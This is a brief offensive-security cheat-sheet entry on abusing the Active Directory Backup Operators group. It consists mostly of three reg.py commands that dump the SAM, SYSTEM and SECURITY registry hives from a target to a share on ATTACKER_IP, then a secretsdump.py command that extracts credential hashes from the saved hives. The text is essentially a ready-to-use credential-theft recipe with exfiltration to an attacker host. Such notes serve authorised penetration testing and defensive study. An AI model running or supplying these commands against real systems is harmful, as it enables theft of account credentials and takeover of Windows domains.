
**Backup Operators** is a built-in group in Active Directory environments that grants members the ability to back up and restore files, regardless of file permissions. Members of this group can bypass NTFS permissions to perform backup and restore operations on the system.

```bash
reg.py domain/user:password@target save -keyName 'HKLM\SAM' -o '\\ATTACKER_IP\share'
reg.py domain/user:password@target save -keyName 'HKLM\SYSTEM' -o '\\ATTACKER_IP\share'
reg.py domain/user:password@target save -keyName 'HKLM\SECURITY' -o '\\ATTACKER_IP\share'
```

Then extract the information:

```bash
secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL
```

